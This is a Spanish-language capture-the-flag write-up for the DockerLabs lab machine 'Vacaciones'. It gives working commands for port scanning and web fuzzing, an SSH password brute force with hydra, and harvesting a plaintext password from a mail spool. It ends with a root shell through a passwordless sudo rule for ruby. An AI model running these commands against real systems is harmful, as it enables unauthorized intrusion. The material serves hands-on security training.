# Vacaciones - DockerLabs

## Reconocimiento

Vamos a comenzar con el reconocimiento de los puertos abiertos en la máquina objetivo. Para ello, utilizaremos la herramienta Nmap.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Veamos que servicios están corriendo en los puertos abiertos.

```bash
nmap -sCV -p22,80 172.17.0.2

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumeremos los directorios del servidor web

```bash
wfuzz -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --hc 404 --hl 368 -u "http://172.17.0.2/FUZZ"
```

No vemos nada interesante, pero al analizar el código fuente de la página web, encontramos un comentario que nos da una pista:

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

Por lo que probamos fuerza bruta con hydra:

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 20
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
```

## Escalada de privilegios

```bash
id
sudo -l
find / -perm -4000 2>/dev/null
crontab -l
getcap -r / 2>/dev/null
```

Recordamos que en el mensaje decía de que dejaron un correo, por lo que vamos al directorio `/var/spool/mail/camilo`

```bash
cat correo.txt 
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Ahora probamos a escalar privilegios con juan

```bash
sudo -l

User juan may run the following commands on 8f64460eb2f5:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Vemos que juan puede ejecutar ruby como root sin necesidad de contraseña, por lo que podemos ejecutar un shell como root:

```bash
sudo ruby -e 'exec "/bin/bash"'

root@8f64460eb2f5:~# whoami
root
```